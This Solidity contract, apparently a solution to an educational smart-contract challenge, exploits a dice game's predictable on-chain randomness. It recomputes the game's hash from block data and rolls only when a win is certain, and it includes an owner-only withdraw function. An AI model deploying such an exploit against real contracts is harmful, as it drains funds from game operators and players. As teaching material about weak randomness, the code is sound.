pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

// import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    event Difficulty(address indexed player, uint256 indexed blockNumber, uint256 difficulty);
    event Roll(address indexed player, uint256 indexed blockNumber, uint8 indexed roll);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner (we bet for 0, 1 and 2)
    function riggedRoll() public {
        //bytes32 prevHash = blockhash(block.number - 1);
        // console.log("difficulty: ", block.difficulty);

        uint256 blockNumber = block.number / 10 * 10 - 10;

        emit Difficulty(msg.sender, blockNumber, block.difficulty);

        bytes32 hash = keccak256(abi.encodePacked(block.difficulty, address(diceGame), blockNumber));
        uint8 roll = uint8(uint256(hash) % 16);

        emit Roll(msg.sender, blockNumber, roll);

        // console.log("THE ROLL IS ",roll);

        require(roll <= 2, "no win");

        diceGame.rollTheDice();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {  }
}
